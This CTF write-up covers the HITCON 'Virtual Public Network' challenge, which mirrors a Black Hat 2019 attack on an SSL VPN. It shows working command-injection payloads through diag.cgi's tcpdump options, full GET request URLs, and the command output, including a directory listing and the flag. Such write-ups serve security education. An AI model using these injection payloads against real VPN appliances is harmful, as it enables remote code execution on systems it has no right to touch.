# Virtual Public Network (🍊)

This problem falls into the time-honored "implement my Black Hat talk" category.  With a little bit of recon we can find [Orange's Black Hat 2019 talk](https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf), which immediately seems relevant, given that the same joke in the problem is on slide 8.

Viewing the page source in the problem, we are given `diag.cgi` and `DSSafe.pm` as "hints".  `diag.cgi` is set up very similarly to the command injection discussed starting on slide 88 (and, in fact, has the same name as the file there).  Here, the idea is to use the error message from `tcpdump` to create an executable perl script, which we put in a template file and then render.

Using this concept, we can fairly easily craft a quick test to make sure everything's working:

---

Options to pass: `-r '$x="ls /",system$x#' 2>./tmp/wao.thtml <`

`GET http://13.231.137.9/cgi-bin/diag.cgi?tpl=wao&options=-r%20'%24x%3D%22ls%20%2F%22,system%24x%23'%202%3E.%2Ftmp%2Fwao.thtml%20%3C`

```
$READ_FLAG$
FLAG
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```

---

Seems like we need to invoke `$READ_FLAG$`, which is annoying because `$` is used for string interpolation.  However, if we invoke bash, we can use an expansion of `*` to invoke the binary, since it's first in the sorted order:

---

Options to pass: `-r '$x="bash -c \"cd / && ./*\"",system$x#' 2>./tmp/wao.thtml <`

`GET http://13.231.137.9/cgi-bin/diag.cgi?tpl=wao&options=-r%20'%24x%3D%22bash%20-c%20%5C%22cd%20%2F%20%26%26%20.%2F*%5C%22%22,system%24x%23'%202%3E.%2Ftmp%2Fwao.thtml%20%3C`

```
hitcon{Now I'm sure u saw my Bl4ck H4t p4p3r :P}
```

---